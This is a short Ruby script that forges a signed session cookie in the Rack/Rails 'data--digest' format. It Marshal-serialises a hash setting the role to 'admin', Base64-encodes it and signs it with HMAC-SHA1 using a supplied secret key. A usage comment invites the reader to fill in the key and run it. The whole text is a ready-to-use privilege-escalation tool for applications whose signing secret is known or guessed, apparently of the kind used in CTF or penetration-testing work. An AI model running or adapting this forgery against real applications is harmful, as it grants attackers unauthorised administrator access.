# Usage: Update key and cookie_data values and run the script. 
# $ ruby create-cookie.rb

require 'base64'
require 'openssl'
# Enter key for signing here 
key = 'secret'
# Insert new cookie attributes and values 
cookie_data = {"role"=>"admin"}
# Serialize and Encode Cookie Data
cookie = Base64.strict_encode64(Marshal.dump(cookie_data)).chomp
# Generate SHA1 Digest of cookie data and key  
digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), key, cookie)
# Output new cookie 
puts("#{cookie}--#{digest}")
